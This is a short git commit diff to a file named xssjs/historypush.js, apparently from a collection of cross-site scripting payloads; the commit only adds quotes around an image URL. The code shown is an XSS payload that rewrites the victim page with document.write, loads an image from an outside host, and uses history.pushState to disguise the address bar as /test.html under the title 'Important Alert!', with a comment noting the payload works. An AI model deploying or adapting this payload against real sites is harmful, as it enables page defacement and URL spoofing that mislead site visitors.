082366d603270f1dc7f838019e635c4f7dd2791d
LichtClark <41386665+LichtClark@users.noreply.github.com>
2022-03-19 16:06:12 +0100

    Update historypush.js

--- xssjs/historypush.js
+++ xssjs/historypush.js
@@ -1,6 +1,6 @@
 setTimeout(function() {
 	document.write("<html><head><title>test</title><div>kekw!</div></head><body></body></html>");
-	document.write("<img src=https://clarky.de/img/mathemann.png>");
+	document.write("<img src='https://clarky.de/img/mathemann.png'>");
 	document.close();
 	<!--console.log("payload working yey");!-->
 	history.pushState(null, "Important Alert!", "/test.html");
